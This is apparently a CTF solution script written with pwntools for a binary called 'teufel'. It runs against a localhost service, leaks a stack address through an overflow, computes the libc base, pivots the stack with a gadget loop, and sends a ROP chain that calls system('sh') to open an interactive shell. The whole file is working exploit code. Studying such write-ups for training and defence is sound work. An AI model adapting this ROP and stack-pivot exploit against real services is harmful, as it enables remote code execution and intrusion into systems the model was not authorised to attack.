#!/usr/bin/env python

from pwn import *

# There is no remote version, because the challenge is already down

# To debug:
# $ socat -v tcp-l:3000,reuseaddr,fork exec:"./teufel"
# $ gdb ./teufel --pid=$(pgrep teufel)
# - use pause() between the parts when you have a bp

x = remote('127.0.0.1', 3000)

libc = ELF('/lib/x86_64-linux-gnu/libc-2.24.so')
libc_offset = 0x5b8000

print util.proc.pidof(x)

function_start = 0x4004e6 # from binary
mov_pop_ret    = 0x400532 # from binary 
pop_rdi_ret    = 0x01fc3a # from libc
"""
gdb-peda$ x /3i 0x0400532
   0x400532:    mov    rsp,rbp
   0x400535:    pop    rbp
   0x400536:    ret
"""

# Send sizeof(msg) + msg as the service expects
def wrap_msg(buf):
  r = ""
  r += p64(len(buf))
  r += buf
  return r

# Overwrite \x00 to leak stack address
x.send(wrap_msg("A" * 0x09))
x.recv(8)

# Leak the stack address
stack_leak = u64(x.recv(6) + "\x00\x00") - 0x41
print 'Stack address leak: ' + hex(stack_leak)

# Calculate the libc base address
libc.address = stack_leak - libc_offset

pause()
# Set esp as `stack_leak - 0x20 - i`, then jump to the function start again
for i in range(0, 64, 8):
  x.send(wrap_msg(p64(function_start) + p64(stack_leak - 0x20 - i)  + p64(mov_pop_ret)))

# Deliver the execve() payload
shell_address = next(libc.search('sh\x00'))
system_address = libc.symbols['system']

payload  = p64(0) * 2 # padding
payload += p64(libc.address + pop_rdi_ret)
payload += p64(shell_address)
payload += p64(system_address)

x.send(wrap_msg(payload))
pause()

x.interactive()
